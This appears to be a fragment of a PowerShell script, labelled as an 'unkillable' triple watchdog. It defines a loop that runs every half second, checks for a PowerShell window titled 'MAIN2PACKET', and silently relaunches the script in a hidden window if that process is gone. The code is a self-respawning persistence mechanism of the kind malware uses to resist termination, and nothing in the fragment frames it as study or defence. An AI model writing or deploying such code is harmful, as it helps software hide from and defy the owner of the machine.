# ===== 1. TRIPLE WATCHDOG (UNKILLBAR) =====
$watchdog1 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
    if (`$p.Count -eq 0) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`"" }
    Start-Sleep -Milliseconds 500
}
"@
